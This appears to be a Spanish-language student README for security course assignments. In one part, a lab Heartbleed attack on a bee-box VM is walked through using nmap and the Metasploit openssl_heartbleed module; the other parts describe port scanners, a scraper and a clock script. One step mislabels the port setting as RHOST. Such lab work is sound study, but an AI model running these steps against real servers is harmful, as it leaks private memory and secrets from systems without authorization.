
README TAREA5

se me dificulpo poco por la redacción e investigue despues de que entregue la tarea mal y la volvi a hacer
Configure las dos maquinas en RED NAT para poder tener ip's unicas y poder
atacarla 
en Bee Box seleccione el modo "Hearthbleed Vulnerability" y le presione "hack" eso me señalo el puerto a utilizar para atacar mas adelante
en mi maquina kali linux use el siguiente comando
nmap -p 8443 --script ssl-heartbleed 10.0.2.4
esto para identificar el servicio vulnerable
abri metasploit (msfconsole)
use lo siguiente "auxiliary/scanner/ssl/openssl_heartbleed
defini el el host al que atacaria "set RHOST 10.0.2.4"
ahora el puerto "set RHOST 8443"
se definir lo siguiente "set verbose true"
y por ultimo corremos el exploit con "exploit"
esto nos arrojara mucho texto en pantalla, y ya para terminar probe los comandos
que se mencionaran en la tarea

timedatectl
uname -a

se guardo los resultados en un txt






################README TAREA6####################3
Script para escanear puertos pero utilizando el paquete python_nmap en lugar de uso de sockets")

se corre el programa 
se pone el objetivo a escanear
checa los puertos abiertos
se imprime los resultados
verifica los protocolos



####################README TAREA8#########################
este es sencillo solo se corre el programa
Importamos el módulo Tkinter 
importamos el método strftime que devuelve la hora local 
Creamos una ventana con Tkinter
Título de la Ventana 
Creamos la función hora() para mostrar la hora en un label
Obtenemos la hora local 
Pasamos la hora al label 
Hacemos un retardo de tiempo de 1 segundo, antes de ejecutar el relo
Estilizo mi reloj
Expandi el reloj en el centro de la ventana    
 Llamamos a la función hora() 
Con el método mainloop() le decimos a Python se detenga hasta aquí y no ejecute nada más  
mainloop()



##############README TAREA 4######################
 Obtencion de los datos mediante peticion GET
Analizamos el contenido HTML con BeautifulSoup
Buscar todos los elementos que el class "card-content"
Buscar todos los elementos que el h2 contenga en su texto
la palabra "python"
Busca cada elemento que tenga referencia de python_jobs
Y almacenarlo en python_jobs_elements
Mostramos la  informacion de python jobs elements
De la lista de elementos de la etiqueta "a" buscamos
el primer elemento que incluya href.

########################## TAREA 3 ########################
Definimos el menú
Escaner de red basico en BASH
Determinando el segmento de red

########################## TAREA 2 ############################
Escaneo de equipos activos en la red
Determinando gateway
Determinando rango de subred
Determinando si $rango termina en "
En ocasiones el rango de subred no termina en punto, necesitamos forzarlo.
Creamos un array con 254 numeros ( 1 a 254) y se almacenan    
En una variable que se llamara $rango_ip
Generamos bucle foreach para validar hosts activos en nuestra subred.
Solicitamos dirección ip a escanear
Generamos bucle foreach para evaluar cada puerto en $portscan
Escaneo de puertos para todos los equipos que estén activos en la red.
Creamos un array con 254 numeros ( 1 a 254) y se almacena 
En una variable que se llamara $rango_ip
Definimos un array con puertos a escanear
Establecemos una variable para waittime
Generamos bucle foreach para validar y escanear cada puertos en cada host activo.








